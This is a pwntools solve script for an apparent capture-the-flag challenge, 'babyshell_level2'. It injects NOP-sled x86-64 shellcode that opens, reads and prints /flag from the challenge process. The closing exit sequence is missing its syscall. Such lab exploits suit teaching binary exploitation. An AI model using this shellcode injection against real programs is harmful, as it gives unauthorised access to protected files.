from pwn import *

context.update(arch="x86-64", encoding="latin")

p = process("/challenge/babyshell_level2")

nopsled = "nop\n"*1024
shellcode = f'''
.global _start
_start:
.intel_syntax noprefix
        {nopsled}
        mov rax, 2
        lea rdi, [rip+flag]
        mov rsi, 0
        mov rdx, 0
        syscall

        mov rdi, rax
        mov rsi, rsp
        mov rdx, 256
        mov rax, 0
        syscall

        mov rdi, 1
        mov rsi, rsp
        mov rax, 1
        syscall

        mov rdi, 0
        mov rax, 60
flag:
        .string "/flag"
'''

shellcode = asm(shellcode)

p.readuntil(b"Reading 0x1000 bytes from stdin.")
p.write(shellcode)
print(p.readall())
